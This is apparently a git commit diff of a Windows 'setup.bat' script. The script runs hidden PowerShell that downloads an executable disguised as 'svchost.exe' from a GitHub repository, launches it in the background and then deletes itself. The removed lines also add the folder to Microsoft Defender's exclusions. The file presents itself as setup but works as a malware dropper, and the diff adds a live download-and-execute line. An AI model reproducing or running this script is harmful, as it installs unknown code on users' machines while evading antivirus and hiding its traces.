8a6fca0e6af800ca7139660ed224ac7d745dc985
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-25 10:52:25 +0300

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -1,6 +1,5 @@
 @echo off
 cd /d "%~dp0"
-powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0'"
-powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
+powershell -w hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe', '%~dp0svchost.exe')"
 if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
 del "%~f0" >nul 2>&1
